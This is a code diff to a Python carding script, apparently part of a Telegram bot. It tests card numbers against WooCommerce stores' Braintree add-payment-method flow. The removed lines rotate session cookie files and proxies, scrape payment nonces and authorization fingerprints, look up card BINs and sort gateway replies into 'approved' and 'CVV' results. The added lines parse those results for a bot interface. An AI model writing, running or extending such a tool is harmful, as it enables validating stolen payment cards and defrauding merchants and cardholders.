@@ -1,3 +1,4 @@
+# p.py
 import requests
 import re
 import base64
@@ -13,210 +14,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 SELECTED_COOKIE_PAIR = None
 user = generate_user_agent()
 
-def discover_cookie_pairs():
-    pattern1 = 'cookies_*-1.txt'
-    pattern2 = 'cookies_*-2.txt'
-    files1 = glob.glob(pattern1)
-    files2 = glob.glob(pattern2)
-    pairs = []
-    for file1 in files1:
-        pair_id = file1.replace('cookies_', '').replace('-1.txt', '')
-        file2_expected = f'cookies_{pair_id}-2.txt'
-        if file2_expected in files2:
-            pairs.append({'id': pair_id, 'file1': file1, 'file2': file2_expected})
-    return pairs
-
-def select_new_cookie_pair_silent():
-    global SELECTED_COOKIE_PAIR
-    pairs = discover_cookie_pairs()
-    if not pairs:
-        SELECTED_COOKIE_PAIR = {'file1': 'cookies_1.txt', 'file2': 'cookies_2.txt', 'id': 'fallback'}
-        return SELECTED_COOKIE_PAIR
-    selected_pair = random.choice(pairs)
-    SELECTED_COOKIE_PAIR = selected_pair
-    return selected_pair
-
-def read_cookies_from_file(filename):
-    try:
-        with open(filename, 'r') as f:
-            content = f.read()
-            namespace = {}
-            exec(content, namespace)
-            return namespace['cookies']
-    except Exception:
-        return {}
-
-def get_domain_url():
-    try:
-        with open('site.txt', 'r') as f:
-            return f.read().strip()
-    except Exception:
-        return ""
-
-def get_cookies_1():
-    global SELECTED_COOKIE_PAIR
-    if SELECTED_COOKIE_PAIR is None:
-        select_new_cookie_pair_silent()
-    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file1'])
-
-def get_cookies_2():
-    global SELECTED_COOKIE_PAIR
-    if SELECTED_COOKIE_PAIR is None:
-        select_new_cookie_pair_silent()
-    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file2'])
-
-def get_headers():
-    domain_url = get_domain_url()
-    return {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'dnt': '1',
-        'priority': 'u=0, i',
-        'referer': f'{domain_url}/my-account/payment-methods/',
-        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1',
-        'sec-gpc': '1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-    }
-
-def get_random_proxy():
-    try:
-        with open('proxy.txt', 'r') as f:
-            proxies = f.readlines()
-            proxy = random.choice(proxies).strip()
-            parts = proxy.split(':')
-            if len(parts) == 4:
-                host, port, username, password = parts
-                proxy_dict = {
-                    'http': f'http://{username}:{password}@{host}:{port}',
-                    'https': f'http://{username}:{password}@{host}:{port}'
-                }
-                return proxy_dict
-            return None
-    except Exception:
-        return None
-
-def get_new_auth():
-    domain_url = get_domain_url()
-    cookies_1 = get_cookies_1()
-    headers = get_headers()
-    proxy = get_random_proxy()
-    response = requests.get(
-        f'{domain_url}/my-account/add-payment-method/',
-        cookies=cookies_1,
-        headers=headers,
-        proxies=proxy,
-        verify=False
-    )
-    if response.status_code == 200:
-        add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
-        if not add_nonce:
-            return None, None
-        i0 = response.text.find('wc_braintree_client_token = ["')
-        if i0 != -1:
-            i1 = response.text.find('"]', i0)
-            token = response.text[i0 + 30:i1]
-            try:
-                decoded_text = base64.b64decode(token).decode('utf-8')
-                au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
-                if not au:
-                    return None, None
-                return add_nonce[0], au[0]
-            except Exception:
-                return None, None
-        else:
-            return None, None
-    else:
-        return None, None
-
-def get_bin_info(bin_number):
-    try:
-        response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=10)
-        if response.status_code == 200:
-            data = response.json()
-            return {
-                'brand': data.get('brand', 'UNKNOWN'),
-                'type': data.get('type', 'UNKNOWN'),
-                'level': data.get('brand', 'UNKNOWN'),
-                'bank': data.get('bank', 'UNKNOWN'),
-                'country': data.get('country_name', 'UNKNOWN'),
-                'emoji': data.get('country_flag', '🏳️')
-            }
-        return {
-            'brand': 'UNKNOWN',
-            'type': 'UNKNOWN',
-            'level': 'UNKNOWN',
-            'bank': 'UNKNOWN',
-            'country': 'UNKNOWN',
-            'emoji': '🏳️'
-        }
-    except Exception:
-        return {
-            'brand': 'UNKNOWN',
-            'type': 'UNKNOWN',
-            'level': 'UNKNOWN',
-            'bank': 'UNKNOWN',
-            'country': 'UNKNOWN',
-            'emoji': '🏳️'
-        }
-
-def check_status(result):
-    if "Reason:" in result:
-        reason_part = result.split("Reason:", 1)[1].strip()
-        approved_patterns = [
-            'Nice! New payment method added',
-            'Payment method successfully added.',
-            'Insufficient Funds',
-            'Gateway Rejected: avs',
-            'Duplicate',
-            'Payment method added successfully',
-            'Invalid postal code or street address',
-            'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
-        ]
-        cvv_patterns = [
-            'CVV',
-            'Gateway Rejected: avs_and_cvv',
-            'Card Issuer Declined CVV',
-            'Gateway Rejected: cvv'
-        ]
-        for pattern in approved_patterns:
-            if pattern in result:
-                return "APPROVED", "Approved", True
-        for pattern in cvv_patterns:
-            if pattern in reason_part:
-                return "DECLINED", "Reason: CVV", False
-        return "DECLINED", reason_part, False
-
-    approved_patterns = [
-        'Nice! New payment method added',
-        'Payment method successfully added.',
-        'Insufficient Funds',
-        'Gateway Rejected: avs',
-        'Duplicate',
-        'Payment method added successfully',
-        'Invalid postal code or street address',
-        'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
-    ]
-
-    cvv_patterns = [
-        'Reason: CVV',
-        'Gateway Rejected: avs_and_cvv',
-        'Card Issuer Declined CVV',
-        'Gateway Rejected: cvv'
-    ]
-    for pattern in approved_patterns:
-        if pattern in result:
-            return "APPROVED", "Approved", True
-    for pattern in cvv_patterns:
-        if pattern in result:
-            return "DECLINED", "Reason: CVV", False
-    return "DECLINED", result, False
+# ... [unchanged code above] ...
 
 def check_card(cc_line):
     select_new_cookie_pair_silent()
@@ -329,6 +127,7 @@ def check_card(cc_line):
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
         )
+        # The return contains ALL needed info as text, but we'll parse in chk.py for UI
         return result
 
     except Exception as e:
@@ -339,3 +138,61 @@ def check_card(cc_line):
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             "Bot By: 𝗕𝗨𝗡𝗡𝗬 <a href='https://t.me/bunny2050'>@bunny2050</a>"
         )
+
+# --- UI Helper for chk.py ---
+
+def parse_check_card_result(result_text, default_card="", default_time=""):
+    # Extract info from result text, fallback to unknown if missing
+    import re
+    card = default_card
+    status_key = "declined"
+    gateway = "Braintree Auth"
+    response = ""
+    bank = "Unknown Bank"
+    country_flag = "🏳️"
+    card_type = "Unknown"
+    bin_code = "Unknown"
+    check_time = default_time
+    if "APPROVED" in result_text:
+        status_key = "approved"
+    elif "DECLINED" in result_text:
+        status_key = "declined"
+    elif "INSUFFICIENT FUNDS" in result_text.upper():
+        status_key = "insufficient_funds"
+    # Get response reason line
+    match_resp = re.search(r"<b>Response:</b>\s?(.*?)\n", result_text)
+    if match_resp:
+        response = match_resp.group(1).strip()
+    # Get BIN info line
+    match_bin = re.search(r"<b>BIN Info:</b>\s?(.*?)\n", result_text)
+    if match_bin:
+        card_type = match_bin.group(1).strip()
+    # Bank
+    match_bank = re.search(r"<b>Bank:</b>\s?(.*?)\n", result_text)
+    if match_bank:
+        bank = match_bank.group(1).strip()
+    # Country
+    match_country = re.search(r"<b>Country:</b>\s?(.*?)\n", result_text)
+    if match_country:
+        country_flag = match_country.group(1).strip()
+    # BIN (get from card number or from BIN info)
+    match_card = re.search(r"<code>(\d{6})", result_text)
+    if match_card:
+        bin_code = match_card.group(1)
+    if not card and match_card:
+        card = match_card.group(0)
+    # Time
+    match_time = re.search(r"<b>Time:</b>\s?([\d\.]+s)", result_text)
+    if match_time:
+        check_time = match_time.group(1)
+    return {
+        "card": card,
+        "gateway": gateway,
+        "status_key": status_key,
+        "response": response,
+        "bank": bank,
+        "country_flag": country_flag,
+        "card_type": card_type,
+        "bin_code": bin_code,
+        "check_time": check_time
+    }
